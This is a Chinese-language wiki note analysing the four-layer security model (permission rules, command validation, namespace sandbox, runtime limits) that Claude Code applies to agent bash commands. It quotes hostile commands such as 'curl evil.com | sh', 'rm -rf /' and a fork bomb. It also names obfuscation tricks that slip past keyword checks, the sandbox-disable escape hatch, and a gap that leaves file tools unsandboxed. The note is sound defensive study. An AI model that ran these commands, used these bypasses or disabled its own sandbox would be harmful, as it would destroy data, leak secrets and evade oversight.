---
title: Claude Code 代码执行安全机制
created: 2026-06-30
updated: 2026-06-30
type: concept
tags: [ai, claude-code, security, sandbox, permission-system, agent-safety, code-execution]
sources:
  - ~/Projects/claw-code/rust/crates/runtime/src/   # Claude Code 的 Rust 复刻（逐文件标注上游对应）
  - https://code.claude.com/docs/en/sandboxing
  - https://code.claude.com/docs/en/permissions
  - https://www.anthropic.com/engineering/claude-code-sandboxing
confidence: medium
---

# Claude Code 代码执行安全机制

> Claude Code 在让 LLM 自主执行 bash 命令时，采用**四层纵深防御**：权限策略闸门 → 命令静态校验 → 操作系统级沙箱包装 → 执行时护栏。核心洞见是——单靠任何一层都不够：启发式关键字校验易被混淆绕过，所以必须用 OS 命名空间隔离兜底；而沙箱只作用于 Bash 工具，文件工具走权限层但不进沙箱，形成已知攻击面。本文以 `claw-code`（Claude Code 的 Rust 复刻，模块注释逐文件标注对应上游 `tools/BashTool/*.ts`）为代码证据，拆解这套安全模型。

---

## 一、核心定位：为什么要四层

让 AI 自主跑 shell 命令是高危操作——一条 `rm -rf /` 或被 prompt injection 注入的 `curl evil.com | sh` 就能毁掉系统或泄密。Claude Code 的解法不是"禁止执行"，而是**让安全执行成为默认且自动的**：

| 设计目标 | 实现手段 |
|---------|---------|
| 防止明显破坏性命令 | 第2层：破坏性模式检测（`rm -rf /`、fork bomb、`dd if=`） |
| 防止越权访问 | 第1层：权限模式 + allow/deny 规则 |
| 防止命令混淆绕过校验 | 第3层：OS 沙箱（unshare 命名空间），校验被绕过也跑不出隔离区 |
| 防止数据外泄 | 第3层：`--net` 网络命名空间断网 |
| 防止进程挂死/上下文爆炸 | 第4层：超时 + stdin null + 16KB 输出截断 |
| 允许安全时免确认自动跑 | 沙箱内命令 + autoAllow 放行，不再逐条弹窗 |

**关键权衡**：安全性与自主性的张力。沙箱内的命令因为"跑不出去"，可以不需要权限弹窗自动执行（`autoAllowBashIfSandboxed`）——这让 agent 更流畅，同时风险可控。这是 Claude Code 沙箱设计的核心动机。

---

## 二、整体执行流程

```
模型发起 Bash 工具调用（command + 可选 sandbox/timeout 字段）
      │
      ▼
┌─────────────────────────────────────────────────────┐
│ 第1层  权限策略 PermissionPolicy.authorize()         │  ← "这个工具该不该被允许"
│   denied_tools → deny_rules → hook override          │
│   → ask_rules → allow_rules → mode 比较              │
└─────────────────────────────────────────────────────┘
      │ Allow
      ▼
┌─────────────────────────────────────────────────────┐
│ 第2层  命令静态校验 bash_validation::validate_command│  ← "这条具体命令危险吗"
│   模式校验 → sed 校验 → 破坏性检测 → 路径校验         │
│   返回 Allow / Warn(需确认) / Block(拒)              │
└─────────────────────────────────────────────────────┘
      │ Allow
      ▼
┌─────────────────────────────────────────────────────┐
│ 第3层  沙箱包装 sandbox::build_linux_sandbox_command │  ← "用什么方式跑"
│   unshare --user --mount [--net] --pid ... sh -lc    │
│   HOME→.sandbox-home, TMPDIR→.sandbox-tmp            │
└─────────────────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────┐
│ 第4层  执行护栏 execute_bash()                       │  ← "跑的过程中的约束"
│   超时杀进程 + stdin→/dev/null + 输出截断 16KB        │
└─────────────────────────────────────────────────────┘
```

---

## 三、第1层：权限策略（PermissionPolicy）

最外层闸门，决定工具调用是否被允许发生。代码：`permissions.rs`。

### 3.1 五种 PermissionMode（权限递增）

| Mode | 含义 | 典型工具 |
|------|------|---------|
| `ReadOnly` | 只读，任何写操作直接拒 | read_file, grep, glob |
| `WorkspaceWrite` | 可写工作区内文件 | write_file, edit |
| `DangerFullAccess` | 完全访问（**bash 默认要求这个**） | bash |
| `Prompt` | 交给交互式提示流程 | — |
| `Allow` | 全部放行 | — |

每个工具注册自己要求的最低 mode（`with_tool_requirement("bash", DangerFullAccess)`）。当前会话有一个 `active_mode`，必须 `active_mode >= required_mode` 才放行。

### 3.2 评估顺序（authorize_with_context，关键）

deny 永远优先于 allow，这是防"放行过宽"的安全网：

```
1. denied_tools 命中?              → 无条件 Deny（最高优先级，绕过一切）
2. deny_rules 命中?                → Deny
3. Hook override = Deny?           → Deny（hook 可一票否决，短路流程）
4. Hook override = Ask / ask_rule? → 弹交互确认
5. allow_rule 命中 或 mode 够高?   → Allow
6. 否则                            → Deny 或弹确认（WorkspaceWrite→DangerFullAccess 升级时）
```

### 3.3 规则匹配语法

直接复刻 Claude Code `settings.json` 的权限格式：

| 规则写法 | 含义 |
|---------|------|
| `bash` | 裸工具名，匹配该工具所有调用 |
| `bash(git:*)` | 前缀匹配，允许/拒绝所有 `git` 开头命令 |
| `bash(rm -rf:*)` | 精确封禁危险子命令 |

`extract_permission_subject()` 会从工具 input JSON 里提取 `command`/`path`/`file_path`/`url`/`pattern`/`code`/`message` 等字段作为匹配对象。规则支持转义括号 `\(` `\)`，匹配器三态：`Any` / `Exact` / `Prefix`（`:*` 后缀）。

### 3.4 Hook 注入（可编程权限层）

`PermissionContext` 允许 hook 在标准评估前注入 override：`Allow` / `Deny` / `Ask`。这让外部系统（如 [[superpowers]] 的 Hook 自动注入）能动态干预权限，而不必改配置文件。

---

## 四、第2层：命令静态校验（bash_validation）

权限放行后，对**这条具体命令文本**做静态分析。代码注释明确：`Ports the upstream BashTool validation pipeline`，对应 Claude Code 的 `tools/BashTool/*.ts`。

### 4.1 四步 pipeline（validate_command）

```rust
pub fn validate_command(command, mode, workspace) -> ValidationResult {
    // 1. 模式校验（含 read-only 检查）
    let result = validate_mode(command, mode);
    if result != Allow { return result; }
    // 2. sed 专项校验
    let result = validate_sed(command, mode);
    if result != Allow { return result; }
    // 3. 破坏性命令警告
    let result = check_destructive(command);
    if result != Allow { return result; }
    // 4. 路径校验
    validate_paths(command, workspace)
}
```

### 4.2 模式校验（validate_mode / validate_read_only）

ReadOnly 模式下封禁三类操作：

| 封禁类别 | 示例命令 |
|---------|---------|
| 写命令 | `cp mv rm mkdir touch chmod chown tee dd truncate shred` |
| 状态修改命令 | `npm pip cargo brew systemctl docker kill mount reboot` |
| 写重定向 | 含 `>` `>>` `>&` |
| 非只读 git | `git push/commit/merge`（放行 `status/log/diff/show/blame` 等只读子命令） |

**穿透 sudo 包装**：`extract_sudo_inner()` 会剥掉 `sudo` 及其 flag，对内部命令递归校验——`sudo rm -rf` 一样被识别拦截。

**穿透环境变量前缀**：`extract_first_command()` 跳过 `FOO=bar` 形式的 env 赋值，识别真正的命令——`A=1 B=2 echo hello` 正确识别为 `echo`。

WorkspaceWrite 模式下，`command_targets_outside_workspace()` 检测命令是否瞄准 `/etc /usr /var /boot /sys /proc /dev /sbin /lib /opt` 等系统目录。

### 4.3 破坏性检测（check_destructive）

命中以下模式发 `Warn`（需用户确认），而非静默 Allow：

```
rm -rf /          → 递归删除根，毁系统
rm -rf ~          → 递归删主目录
rm -rf * / .      → 递归删当前目录全部
mkfs              → 格式化，毁数据
dd if=            → 裸磁盘写，可能覆盖分区
> /dev/sd         → 写裸磁盘设备
chmod -R 777      → 递归设世界可写
chmod -R 000      → 递归移除所有权限
:(){ :|:& };:     → fork bomb，崩系统
```

`shred` / `wipefs` 无条件标记为破坏性。任何 `rm` + `-r` + `-f` 组合都至少 Warn。

### 4.4 路径校验（validate_paths）

- `../` 目录穿越检测（若能解析到工作区内则放行，否则 Warn）
- `~/` 或 `$HOME` 引用检测（可能逃出工作区，Warn）

### 4.5 命令语义分类（classify_command）

`CommandIntent` 七态：`ReadOnly / Write / Destructive / Network / ProcessManagement / PackageManagement / SystemAdmin / Unknown`。用于动态决定命令的 required_mode——例如 `ls/cat/grep` 是 ReadOnly，`curl/wget/ssh` 是 Network，`sudo/chroot/iptables` 是 SystemAdmin。这让权限决策能"看懂"命令意图，而非只看工具名。

### 4.6 这一层的局限

**纯启发式关键字匹配**——优点是快、覆盖常见危险；致命局限是**无法防御混淆**。例如反引号嵌套、base64 解码执行、变量拼接 (`a=rm; $a -rf /`) 都可能绕过。这正是为什么必须有第3层 OS 沙箱兜底。

---

## 五、第3层：操作系统级沙箱（sandbox + prepare_command）

**最核心的"安全执行"机制。真正在操作系统层面隔离命令。** 代码：`sandbox.rs` + `bash.rs:prepare_command`。

### 5.1 Linux 实现：unshare 命名空间隔离

```bash
unshare --user --map-root-user --mount --ipc --pid --uts --fork \
        [--net] sh -lc "<用户的命令>"
```

| unshare flag | 隔离维度 | 安全意义 |
|--------------|---------|---------|
| `--user --map-root-user` | 新 user namespace | 沙箱内"看起来是 root"但实际无宿主权限 |
| `--mount` | 独立挂载命名空间 | 配合 filesystem_mode 限制可访问目录 |
| `--net`（可选） | 独立网络命名空间 | **断网**，防数据外泄/恶意回连 |
| `--pid` | 独立进程命名空间 | 隔离进程视图 |
| `--ipc --uts` | IPC/主机名隔离 | 进一步隔离 |

### 5.2 文件系统隔离模式（FilesystemIsolationMode）

```rust
pub enum FilesystemIsolationMode {
    Off,            // 不隔离
    WorkspaceOnly,  // 默认：只能访问工作区目录
    AllowList,      // 仅访问配置的 allowed_mounts
}
```

激活时强制重写环境变量，让临时文件/配置都落到沙箱内：
- `HOME` → `<cwd>/.sandbox-home`
- `TMPDIR` → `<cwd>/.sandbox-tmp`

并预创建这两个目录（`prepare_sandbox_dirs`）。

### 5.3 关键工程硬化（踩坑后的防御）

这些细节体现了实战经验：

**① 先实测 unshare 能否工作**——`unshare_user_namespace_works()`：
```rust
// GitHub Actions 等 CI 环境里 unshare binary 存在，
// 但用户命名空间被限制，会静默失败。
fn unshare_user_namespace_works() -> bool {
    if !command_exists("unshare") { return false; }
    Command::new("unshare")
        .args(["--user", "--map-root-user", "true"])
        .status()
        .is_ok_and(|s| s.success())
}
```
结果用 `OnceLock` 缓存（只测一次）。测不通就 fallback 到普通 `sh -lc`，并在 `SandboxStatus.fallback_reason` 记录原因（如 "namespace isolation unavailable (requires Linux with unshare)"）。

**② 容器环境检测**——`detect_container_environment()` 检查 `/.dockerenv`、`/run/.containerenv`、`/proc/1/cgroup`（找 docker/containerd/kubepods/podman 标记）、环境变量（`container`/`docker`/`podman`/`kubernetes_service_host`）。判断是否已在容器内，避免无意义的嵌套沙箱。

**③ 逃生舱 `dangerouslyDisableSandbox`**——当沙箱内命令失败（如需要网络才能跑通），可显式请求"不沙箱"重跑。字段名本身就是警告。这在 `BashCommandInput` 里是可选 bool。

### 5.4 SandboxStatus：完整的可观测性

每次执行都返回结构化的沙箱状态，让模型和用户知道**实际**生效了什么：

```rust
pub struct SandboxStatus {
    pub enabled: bool,           // 是否请求了沙箱
    pub requested: SandboxRequest,
    pub supported: bool,         // 系统是否支持
    pub active: bool,            // 是否真正激活
    pub namespace_active: bool,
    pub network_active: bool,
    pub filesystem_active: bool,
    pub in_container: bool,
    pub container_markers: Vec<String>,
    pub fallback_reason: Option<String>,  // 为什么没生效
}
```

### 5.5 ⚠️ 已知攻击面：沙箱只作用于 Bash

社区已知（GitHub issue #26616）：**Edit/Write 等文件工具走第1层权限但不进沙箱**。这意味着理论上 agent 可读写自己的配置文件。这是设计取舍——文件操作的结构化程度高（明确的 path），用权限规则足够；bash 是任意代码，才需要 OS 隔离。

---

## 六、第4层：执行时护栏（execute_bash）

命令真正跑起来后的约束。代码：`bash.rs`。

| 护栏 | 实现 | 防的问题 |
|------|------|---------|
| **超时** | `tokio::time::timeout(timeout_ms)` | 死循环、卡死的命令 |
| **stdin→/dev/null** | `prepared.stdin(Stdio::null())` | `cat` 等待输入挂死 |
| **输出截断 16KB** | `MAX_OUTPUT_BYTES = 16384` | 上下文窗口爆炸 |
| **后台任务** | `run_in_background` 分离子进程 | 长任务不阻塞 |

**超时的智能分类**：若是 `cargo test/pytest/npm test` 等测试命令超时，标记为 `test.hung`（而非普通 `timeout`），并附结构化 provenance（`event: test.hung, failureClass: test_hang`）。这帮助模型区分"命令卡住"和"测试本身慢"。

**16KB 截断的 UTF-8 安全**：按字符边界切分（`is_char_boundary`），避免切出半个汉字，截断后追加 `[output truncated — exceeded 16384 bytes]` 标记。

---

## 七、各层协同与纵深防御价值

```
攻击场景                    第1层  第2层  第3层  第4层    结果
─────────────────────────────────────────────────────────────
rm -rf /                   ───→  Warn   ───→  ───→   需确认 ✓
sudo rm -rf /tmp/x (RO)    Deny  (穿透sudo)         拒绝 ✓
curl evil.com | sh         ───→  ───→  断网         无法回连 ✓
cat $(echo rm)             ───→  漏判  沙箱兜底      跑不出 ✓
echo $BIG > file (RO)      Deny  (重定向)           拒绝 ✓
test 死循环                 ───→  ───→  ───→  超时   杀进程 ✓
```

**纵深防御的核心价值**：第2层（关键字校验）被混淆绕过时，第3层（OS 沙箱）仍然兜底——即便恶意命令跑起来了，也跑不出隔离区、连不上网。任一单层失效都不会导致系统被毁。

---

## 八、真实 Claude Code 与本复刻的差异

| 维度 | 真实 Claude Code（上游） | claw-code 复刻 |
|------|------------------------|---------------|
| 语言 | TypeScript | Rust |
| macOS 沙箱 | Apple Sandbox framework (`sandbox-exec`) + Endpoint Security | ❌ 未实现（仅 Linux） |
| Linux 沙箱 | namespace 机制 | `unshare` 命名空间 |
| 沙箱范围 | 仅 Bash 工具 | 仅 Bash 工具（一致） |
| 权限规则 | settings.json allow/deny/ask | 一致语法 |
| 16KB 截断 | 是 | 一致 |

**可信度**：claw-code 的安全模块逐文件标注了对上游的对应关系（`Corresponds to upstream tools/BashTool/xxx.ts`），权限规则语法、`dangerouslyDisableSandbox` 字段名、16KB 截断、unshare 沙箱——均与 Anthropic 官方文档和已知 Claude Code 行为吻合。**架构和机制描述可信**，适合学习。

**质量警示**：该仓库本身的工程信号混杂——README 大量 Discord 引流、1.1MB 的 ROADMAP.md、PARITY.md 显示 48599 行 Rust 仅 3 作者 4 天完成（2026-03-31→04-03），强烈暗示 AI 批量生成。**具体实现的健壮性未必经得起真实安全考验**，勿照搬进生产。

---

## 九、相关隔离技术对比

Claude Code 的 unshare 沙箱是"轻量进程级隔离"。生态里有更重或更形式化的方案：

| 项目 | 隔离技术 | 定位 |
|------|---------|------|
| **Claude Code** | `unshare` 命名空间 | CLI agent 内置，轻量，进程级 |
| [[openshell]] | Landlock + seccomp + namespace + OPA + Z3 形式化验证 | NVIDIA 的 Agent 沙箱平台，多层 + 形式化验证，最重 |
| [[agent-sandbox]] | gVisor / Kata Containers（K8s CRD） | K8s 原生，容器级，Scale-to-zero + WarmPool |

OpenShell 的 Landlock（Linux 文件系统访问控制）+ seccomp（系统调用过滤）是比单纯 namespace 更细粒度的内核级防护，配合 OPA 策略引擎和 Z3 形式化验证，适合对隔离强度要求极高的场景。Claude Code 选择 unshare 是为了**零依赖、开箱即用**的平衡。

---

## 十、设计启示

1. **纵深防御是底线**——单层校验必被绕过，OS 隔离兜底不可省
2. **安全执行 = 安全可自动化**——沙箱内的命令因风险可控可免确认，这是 agent 自主性的关键解锁
3. **可观测性即安全**——`SandboxStatus` 让"实际生效了什么"对模型透明，fallback_reason 避免静默失败
4. **逃生舱要显式且警告**——`dangerouslyDisableSandbox` 的命名本身就是防御
5. **攻击面要诚实标注**——沙箱不覆盖文件工具是已知取舍，而非隐藏的缺陷

## 相关

- [[claude-code-workflow]] — Claude Code 的 Workflow 工具：确定性多 agent 编排引擎（正交主题，讲编排而非执行安全）
- [[superpowers]] — AI 编码 agent 行为塑造技能，含 Hook 自动注入机制（与权限层的 hook override 相关）
- [[swarmclaw]] — Claude Code 的自托管替代运行时（同生态）
- [[openshell]] — NVIDIA Agent 沙箱：Landlock+seccomp+namespace 多层隔离，可对比隔离技术强度
- [[agent-sandbox]] — K8s 原生 Agent 沙箱 CRD（gVisor/Kata 容器级隔离）
- [[heuristic-learning]] — coding agent 的学习范式（与 agent 自主执行的安全语境相关）
